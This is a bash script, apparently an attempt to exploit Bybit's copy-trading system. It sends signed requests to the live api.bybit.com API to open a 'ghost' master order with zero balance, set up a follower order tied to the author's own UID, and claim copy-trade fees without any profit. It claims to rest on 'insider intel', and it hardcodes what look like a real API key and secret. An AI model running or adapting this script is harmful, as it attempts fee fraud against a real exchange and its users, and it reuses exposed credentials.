#!/bin/bash
# COPY TRADING GHOST FEES EXPLOIT (FIXED NOV 2025)
# Based on insider intel: /v5/order/create with isCopyTrading flag

API_KEY="22JSr5zWpW0eReC6rE"
API_SECRET="QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE="https://api.bybit.com"
MY_UID="527465456"

# Sync Time
OFFSET=$(($(curl -s "$BASE/v5/market/time" | grep -o '"timeSecond":"[0-9]*"' | cut -d'"' -f4) - $(date +%s)))

sign() {
    local p=$1
    local t=$(($(date +%s) + OFFSET))000
    local s=$(echo -n "${t}${API_KEY}5000${p}" | openssl dgst -sha256 -hmac "$API_SECRET" | awk '{print $2}')
    echo "$t|$s"
}

echo "=========================================="
echo "COPY TRADING GHOST FEES ATTACK"
echo "Using FIXED endpoint: /v5/order/create"
echo "=========================================="

# Step 1: Try to CREATE MASTER ORDER (Zero Balance Test)
echo ""
echo "[1] Creating MASTER Copy Trade Order (Ghost)..."
MASTER_PAYLOAD='{
  "category": "linear",
  "symbol": "BTCUSDT",
  "side": "Buy",
  "orderType": "Market",
  "qty": "0.001",
  "isCopyTrading": true,
  "copyTrading": true
}'

IFS='|' read -r ts sig <<< $(sign "$MASTER_PAYLOAD")

master_resp=$(curl -s -X POST "$BASE/v5/order/create" \
    -H "X-BAPI-API-KEY: $API_KEY" \
    -H "X-BAPI-SIGN: $sig" \
    -H "X-BAPI-SIGN-TYPE: 2" \
    -H "X-BAPI-TIMESTAMP: $ts" \
    -H "X-BAPI-RECV-WINDOW: 5000" \
    -H "Content-Type: application/json" \
    -d "$MASTER_PAYLOAD")

echo "Response: $master_resp"

master_code=$(echo "$master_resp" | grep -o '"retCode":[0-9]*' | cut -d':' -f2)
echo "RetCode: $master_code"

if [ "$master_code" == "0" ]; then
    echo "🚨 CRITICAL: Master order created with ZERO balance!"
    order_id=$(echo "$master_resp" | grep -o '"orderId":"[^"]*"' | cut -d'"' -f4)
    echo "Order ID: $order_id"
elif [ "$master_code" == "10024" ]; then
    echo "❌ Blocked: Regulatory/KYC restriction (expected)"
elif [ "$master_code" == "110007" ]; then
    echo "⚠️  Insufficient Balance (expected, but order logic processed)"
else
    echo "⚠️  Code: $master_code"
fi

# Step 2: Try FOLLOWER order (Simulate copying master)
echo ""
echo "[2] Creating FOLLOWER Copy Trade Order..."

FOLLOWER_PAYLOAD="{
  \"category\": \"linear\",
  \"symbol\": \"BTCUSDT\",
  \"side\": \"Buy\",
  \"orderType\": \"Market\",
  \"qty\": \"0.001\",
  \"isCopyTrading\": true,
  \"copyTrading\": true,
  \"masterUid\": \"$MY_UID\"
}"

IFS='|' read -r ts sig <<< $(sign "$FOLLOWER_PAYLOAD")

follower_resp=$(curl -s -X POST "$BASE/v5/order/create" \
    -H "X-BAPI-API-KEY: $API_KEY" \
    -H "X-BAPI-SIGN: $sig" \
    -H "X-BAPI-SIGN-TYPE: 2" \
    -H "X-BAPI-TIMESTAMP: $ts" \
    -H "X-BAPI-RECV-WINDOW: 5000" \
    -H "Content-Type: application/json" \
    -d "$FOLLOWER_PAYLOAD")

echo "Response: $follower_resp"

# Step 3: Try to CLAIM fees (Ghost Claim)
echo ""
echo "[3] Attempting Fee Claim (Ghost)..."
CLAIM_PAYLOAD='{"coin":"USDT"}'
IFS='|' read -r ts sig <<< $(sign "$CLAIM_PAYLOAD")

claim_resp=$(curl -s -X POST "$BASE/v5/copytrade/claim" \
    -H "X-BAPI-API-KEY: $API_KEY" \
    -H "X-BAPI-SIGN: $sig" \
    -H "X-BAPI-SIGN-TYPE: 2" \
    -H "X-BAPI-TIMESTAMP: $ts" \
    -H "X-BAPI-RECV-WINDOW: 5000" \
    -H "Content-Type: application/json" \
    -d "$CLAIM_PAYLOAD")

echo "Claim Response: $claim_resp"

claim_code=$(echo "$claim_resp" | grep -o '"retCode":[0-9]*' | cut -d':' -f2)
if [ "$claim_code" == "0" ]; then
    echo "🚨🚨🚨 CRITICAL VULNERABILITY: Fee claimed with 0 profit!"
    echo "Amount: $(echo "$claim_resp" | grep -o '"amount":"[^"]*"')"
else
    echo "Claim Code: $claim_code"
fi

echo ""
echo "=========================================="
